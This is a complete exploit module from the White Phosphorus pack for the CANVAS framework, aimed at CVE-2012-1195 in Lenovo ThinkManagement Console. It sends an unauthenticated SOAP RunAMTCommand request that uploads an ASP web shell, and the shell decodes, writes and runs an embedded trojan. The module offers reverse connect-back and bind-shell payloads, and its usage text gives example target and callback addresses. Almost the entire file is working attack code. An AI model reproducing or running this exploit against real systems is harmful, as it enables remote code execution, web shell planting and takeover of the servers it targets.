
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from MOSDEF import pelib
from libs.canvasos import canvasos
import libs.spkproxy as spkproxy


NAME = "Lenovo ThinkManagement Console ServerSetup RunAMTCommand Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in Lenovo ThinkManagement Console"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Lenovo'
DOCUMENTATION["Date public"] = "2012-02-15"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2012-1195"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1195'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/79276"
DOCUMENTATION["Notes"] = """
This module drops two files which must be removed manually.
An .exe in c:\temp\ and a .asp in c:\Program Files\LANDesk\ManagementSuite\upl\

Module provides shell with network service privilages
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
This module drops two files which must be removed manually.
An .exe in c:\temp and a .asp in c:\Program Files\LANDesk\ManagementSuite\upl\

Module provides shell with network service privilages

----------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Lenovo ThinkManagement Console ServerSetup RunAMTCommand Remote Code Execution
----------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_lenovo_thinkmanagementconsole_runamtcommand/wp_lenovo_thinkmanagementconsole_runamtcommand.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 80

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 2

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.vProtect = True
        self.useRawShellcode = True
        self.data1 = "".join( [ random.choice(string.uppercase) for x in range(8) ] )
        self.data2 = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + '.asp'
        self.tempExeFile = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + '.exe'
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_bannerchecktest(self,self.host,self.port,{"ServerSetup Web Service": 1},5000,"GET /landesk/managementsuite/core/core.anonymous/ServerSetup.asmx HTTP/1.0\r\n\r\n")

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        self.log("WP> Building MOSDEF PE Trojan")
        myPElib = pelib.PElib()
        try:
            self.mosdeftrojan=myPElib.createPEFileBuf(self.shellcode)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        b64trojan = b64encode(self.mosdeftrojan)
        b64trojan = b64trojan[:-1]
        
        asp_payload = '''<%
Dim Base64Chars
Base64Chars =	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
                "abcdefghijklmnopqrstuvwxyz" & _
                "0123456789" & _
                "+/"
Public Function mimedecode( byVal strIn )
        If Len( strIn ) = 0 Then 
                mimedecode = -1 : Exit Function
        Else
                mimedecode = InStr( Base64Chars, strIn ) - 1
        End If
End Function

Public Function base64_decode( byVal strIn )
        Dim w1, w2, w3, w4, n, strOut
        For n = 1 To Len( strIn ) Step 4
                w1 = mimedecode( Mid( strIn, n, 1 ) )
                w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
                w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
                w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
                If w2 >= 0 Then _
                        strOut = strOut + _
                                Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
                If w3 >= 0 Then _
                        strOut = strOut + _
                                Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
                If w4 >= 0 Then _
                        strOut = strOut + _
                                Chr( ( ( w3 * 64 + w4 ) And 255 ) )
        Next
        base64_decode = strOut
End Function

dim fs,fname,base64decoded,WshShell, oExec
base64decoded=base64_decode("BASE64_PAYLOAD")
set fs=Server.CreateObject("Scripting.FileSystemObject")
set fname=fs.CreateTextFile("C:\\temp\\TEMPEXE_FILE",true)
fname.WriteLine(base64decoded)
fname.Close
set fname=nothing
set fs=nothing
set WshShell = CreateObject("WScript.Shell")
set oExec = WshShell.Exec("c:\\temp\\TEMPEXE_FILE")
%>'''
        asp_payload = asp_payload.replace('BASE64_PAYLOAD', b64trojan)
        asp_payload = asp_payload.replace('TEMPEXE_FILE', self.tempExeFile)
        
        payload = '''<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <RunAMTCommand xmlns="http://tempuri.org/">
      <Command>-PutUpdateFileCore</Command>
      <Data1>DATA_ONE</Data1>
      <Data2>DATA_TWO</Data2>
      <Data3>DATA_THREE</Data3>
      <ReturnString>string</ReturnString>
    </RunAMTCommand>
  </soap12:Body>
</soap12:Envelope>
'''
        payload = payload.replace('DATA_ONE', self.data1)
        payload = payload.replace('DATA_TWO', 'upl\\%s'%self.data2)
        payload = payload.replace('DATA_THREE', '<![CDATA[%s]]>'%asp_payload)
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()        
        
        useragentstring = "http://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        UA.addHeader('Content-Type','application/soap+xml; charset=utf-8')
        self.log("WP> Sending Exploit")
        try:
            data = UA.POST("/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx", payload, extraheaders=None, noresponse=True)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        time.sleep(5)
        data = UA.GET("/upl/%s"%self.data2, noresponse=True)

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
